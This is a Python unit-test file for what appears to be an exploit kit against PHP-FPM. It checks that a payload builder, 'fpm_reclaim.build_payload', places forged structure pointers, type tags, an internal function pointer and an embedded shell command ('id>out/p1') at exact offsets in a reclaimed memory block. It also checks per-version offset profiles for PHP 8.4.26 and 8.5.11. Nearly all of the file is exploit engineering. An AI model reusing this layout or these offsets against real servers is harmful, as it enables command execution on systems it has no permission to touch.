import os
import struct
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT / "src" / "tools"))

import fpm_reclaim  # noqa: E402
import profiles  # noqa: E402


class ReclaimPayloadTest(unittest.TestCase):
    def test_layout_offsets(self):
        d = 0x7F0000000000
        k = 0xFE8
        size = 8192
        zif = 0x7F0000200000
        cmd = b"id>out/p1"
        b = fpm_reclaim.build_payload(d, k, size, zif, cmd)
        self.assertEqual(len(b), size)
        self.assertEqual(struct.unpack_from("<Q", b, k + 0)[0], d + 56)
        self.assertEqual(struct.unpack_from("<q", b, k + 56)[0], 2)
        self.assertEqual(struct.unpack_from("<Q", b, k + 56 + 16 + 8)[0], d + 0x300)
        self.assertEqual(struct.unpack_from("<Q", b, k + 0x300)[0], d + 0x500)
        self.assertEqual(struct.unpack_from("<I", b, k + 0x300 + 8)[0], 0x10A)
        self.assertEqual(struct.unpack_from("<Q", b, k + 0x508)[0], d + 0x700)
        self.assertEqual(struct.unpack_from("<I", b, k + 0x510)[0], 0x307)
        self.assertEqual(struct.unpack_from("<Q", b, k + 0x730)[0], zif)
        self.assertEqual(struct.unpack_from("<Q", b, k + 0x800 + 80)[0], d + 0x880)
        self.assertEqual(struct.unpack_from("<Q", b, k + 0x880 + 16)[0], len(cmd))
        self.assertEqual(b[k + 0x880 + 24:k + 0x880 + 24 + len(cmd)], cmd)

    def test_too_small(self):
        with self.assertRaises(ValueError):
            fpm_reclaim.build_payload(0x100000, 0xFE8, 0x800, 0x200000, b"id")

    def test_command_limits(self):
        with self.assertRaises(ValueError):
            fpm_reclaim.build_payload(0x100000, 0xFE8, 8192, 0x200000, b"a" * 0x58)
        with self.assertRaises(ValueError):
            fpm_reclaim.build_payload(0x100000, 0xFE8, 8192, 0x200000, b"a\x00b")


class ProfileTest(unittest.TestCase):
    def test_8426(self):
        p = profiles.PROFILES["8.4.26"]
        self.assertEqual(p.zif_offset, 0x465370)
        self.assertEqual(p.dtor_offset, 0x65EB60)
        self.assertTrue(p.pure128)
        self.assertEqual(p.psv_offset, 0x168)

    def test_8311(self):
        p = profiles.PROFILES["8.5.11"]
        self.assertEqual(p.version, "8.5.11")

    def test_exact(self):
        self.assertIs(profiles.exact("8.4.26"), profiles.PROFILES["8.4.26"])
        self.assertIsNone(profiles.exact("8.4.27"))


if __name__ == "__main__":
    unittest.main()
